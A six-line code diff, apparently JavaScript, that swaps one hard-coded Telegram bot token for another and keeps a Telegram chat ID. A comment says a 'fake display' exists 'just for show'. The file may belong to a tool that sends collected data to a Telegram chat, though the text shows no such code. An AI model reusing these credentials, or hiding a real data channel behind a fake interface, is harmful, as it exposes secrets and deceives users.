@@ -1,6 +1,6 @@
 // ===== GLOBAL CONFIGURATION =====
 // REAL TOKEN AND CHAT ID (Public - No Problem)
-const TELEGRAM_BOT_TOKEN = "8306598806:AAHZBum6bAe_4JPIpg_MiOQP0nz_GfD7z5o";
+const TELEGRAM_BOT_TOKEN = "8880011411:AAGN50_KwMg0OPHWnpFQUMVKX45PSdeejpg";
 const TELEGRAM_CHAT_ID = "5825685797";
 
 // Fake display for UI only (Just for show)
